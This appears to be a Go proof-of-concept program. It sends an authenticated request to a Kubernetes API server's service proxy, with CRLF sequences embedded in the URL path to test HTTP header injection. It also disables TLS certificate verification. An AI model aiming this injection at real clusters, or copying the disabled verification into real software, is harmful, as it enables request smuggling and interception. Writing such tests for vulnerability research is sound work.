package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

var (
	token = flag.String("token", "", "Kubernetes access token")
)

func main() {
	flag.Parse()
	if *token == "" {
		fmt.Printf("missing required token")
		os.Exit(1)
	}

	// target := "https://35.188.140.21/api/v1/namespaces/default/services/http-dump/proxy/" + url.PathEscape("?a=1 HTTP/1.1\r\nX-injected: foo-bar\r\n")
	target := "https://35.188.140.21/api/v1/namespaces/default/services/http-dump/proxy/?a=1 HTTP/1.1\r\nX-injected: foo-bar\r\n"

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		log.Fatalf("Error creating request: %v", err)
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", *token))
	req.Header.Set("Manual-Inject", "I added this")

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Request error: %v", err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		log.Fatalf("Error reading response body: %v", err)
	}

	fmt.Printf("Response Body:\n%s\n", body)
}
